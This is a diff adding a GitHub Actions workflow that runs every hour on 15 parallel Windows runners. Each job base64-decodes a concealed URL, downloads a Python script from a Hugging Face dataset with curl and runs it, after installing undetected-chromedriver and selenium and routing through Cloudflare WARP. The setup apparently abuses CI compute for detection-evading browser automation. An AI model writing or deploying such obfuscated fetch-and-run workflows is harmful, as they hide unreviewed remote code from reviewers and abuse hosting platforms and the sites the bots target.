@@ -1,0 +1,70 @@
+name: Automated Workforce Pipeline
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: system-runner-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  dispatch-workers:
+    name: "WorkerNode-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+
+    steps:
+      - name: Setup Workspace & Fetch Script
+        shell: bash
+        run: |
+          echo "[INIT] Preparing WorkerNode-${{ matrix.node_index }}..."
+          
+          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
+          TARGET_RESOURCE_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS92YXovcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$TARGET_RESOURCE_URI" -o worker_task.py
+          
+          echo "[INIT] Updating dependencies..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[INIT] Environment setup completed."
+
+      - name: Execute Routine & Monitor Timeout
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "[RUN] Executing script on node ${{ matrix.node_index }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessConfig = @{
+              FilePath     = "python"
+              ArgumentList = "worker_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ActiveWorkerProcess = Start-Process @ProcessConfig
+          
+          Write-Host "[WATCHDOG] Execution timer started (Limit: 74 mins)."
+          
+          try {
+              Wait-Process -InputObject $ActiveWorkerProcess -Timeout 4440 -ErrorAction Stop
+              Write-Host "[SUCCESS] Task finished without issues."
+          }
+          catch {
+              Write-Host "[WARN] Time limit exceeded. Aborting instance..."
+              Stop-Process -InputObject $ActiveWorkerProcess -Force
+              Write-Host "[CLEANUP] Process terminated safely."
+          }
+
+      - name: Job Completion Step
+        shell: bash
+        run: echo "[COMPLETE] WorkerNode-${{ matrix.node_index }} finished."
